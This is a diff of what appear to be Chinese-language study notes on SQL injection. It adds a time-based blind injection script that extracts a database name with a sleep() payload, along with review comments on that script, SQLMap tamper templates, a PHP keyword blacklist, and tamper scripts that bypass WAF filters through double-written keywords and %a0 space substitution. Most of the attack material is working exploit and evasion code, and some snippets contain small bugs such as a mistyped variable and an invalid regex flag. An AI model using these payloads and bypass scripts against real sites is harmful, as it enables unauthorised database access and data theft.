@@ -2216,6 +2216,8 @@ if __name__ == '__main__':
 <summary>获取数据库名的函数_time模块</summary>
 
 ```
+//time-based blind SQL injection
+
 def GetDBName(url):
     global DBName
     print("[-]开始获取数据库的长度")
@@ -2233,7 +2235,7 @@ def GetDBName(url):
     payload = "'and if(ascii(substr(database(),{0},1))={1},sleep(5),0) %23"
     targetUrl = url + payload
     for a in range(1, DBNameLen+1):
-        for b in range(1, DBNameLen+1):
+        for b in range(33, 127):
             timeStart = time.time()
             res = conn.get(targetUrl.format(a,b))
             timeEnd = time.time()
@@ -2241,6 +2243,149 @@ def GetDBName(url):
                 DBName += chr(b)
                 print("[-]"+ DBName)
                 break
+__________________
+前面用了：global DBName
+但是代码片段没有看到：DBName = ""
+否则：DBName += chr(b)
+可能报：NameError
+或者UnboundLocalError
+__________________
+最好不要只判断5秒
+if timeEnd-timeStart>=5:
+实际网络会有波动，一般会写：
+if timeEnd - timeStart > 4.5:
+或者设置请求超时并结合容差判断，否则容易误判
+__________________
 ```
 
 </details>
+
+<details>
+<summary>SQLMap的Tamper脚本_SQLMap开源自动化</summary>
+
+```
+----------------------------------------------------------------------------
+基于布尔的盲注：能根据页面的返回内容判断真假的注入技术
+基于时间的盲注：不能根据页面的返回内容判断信息，而是使用条件语句查看时间延迟语句是否执行（即页面的返回时间是否增加），以此判断
+基于报错的注入：根据页面返回的错误信息判断，把注入语句的结果直接返回到页面
+堆查询注入：可以同时执行多条语句的执行时注入
+----------------------------------------------------------------------------
+SQLMap的提供了57个Tamper脚本，绕过IDS/WAF的检测
+
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+__poriority__ = PRIORITY.LOW     //定义脚本的优先级
+
+def dependencies():
+    pass
+
+// 对传进来的payload进行修改并返回，函数有两个参数。
+// 主要更改的是payload参数，kwargs参数用得不多。
+// 官方提供的Tamper脚本两次更改http-header
+
+def tamper(payload, **kwargs):
+    # 增加相关的payload处理，再将payload返回
+    # 必须返回最后的payload
+    return payload
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>绕过目标网站 防SQL注入系统的Tamper脚本</summary>
+
+```
+//格式  preg_replace(正则表达式, 替换内容, 原字符串)
+
+function blacklist($id)
+{
+$id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)
+$id= preg_replace('/and/i',"",$id); //strip out AND (non case sensitive)
+$id= preg_replace('/[\/\*]/',"",$id); //strip out /*
+$id= preg_replace('/[--]/',"",$id); //strip out --
+$id= preg_replace('/[#]/',"",$id); //strip out #
+$id= preg_replace('/[\s]/',"",$id); //strip out spaces
+$id= preg_replace('/[\/\\\\]/',"",$id); //strip out slashes
+return $di;
+}
+```
+
+</details>
+
+<details>
+<summary>双写绕过脚本_dounble-and-ro.py</summary>
+
+```
+----------------------------------------------------------------------------
+//tamper(payload,**kwargs字典）
+//tamper(
+//    payload="1 and 1=1",
+//    headers={},
+//    delimiter=",",
+//    hints={}
+//)
+----------------------------------------------------------------------------
+#！/usr/bin/env python
+# -*- coding:UTF-8 -*-
+
+import re
+from lib.core.enums import PRIORITY //LOW,NORMAL,HIGH
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():  //脚本描述函数
+    pass
+
+def tamper(payload, **kwargs):
+    retVal = payload
+    if payload:
+        retVal = re.sub(r"(?i)(or)", r"oorr", retVal)
+        retVal = re.sub(r"(?!)(and)", r"anandd", retVal)
+    return retVal
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>空格替换脚本_space2A0.py</summary>
+
+```
+#!/usr/bin/env python
+# -*- coding:UTF-8 -*-
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    retVal = payload
+
+    if payload:
+        retVal = ""
+        quote, doublequote, firstspace = False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace = True
+                    retVal += "%a0"
+                    continue
+
+            elif payload[i] == '\'':
+                quote = not quote
+
+            elif payload[i] == '"':
+                doublequote = not doublequote
+
+            elif payload[i] == " " and not doublequote and not quote:
+                retVal += "%a0"
+                continue
+
+            retVal += payload[i]
+    return retVal
+```
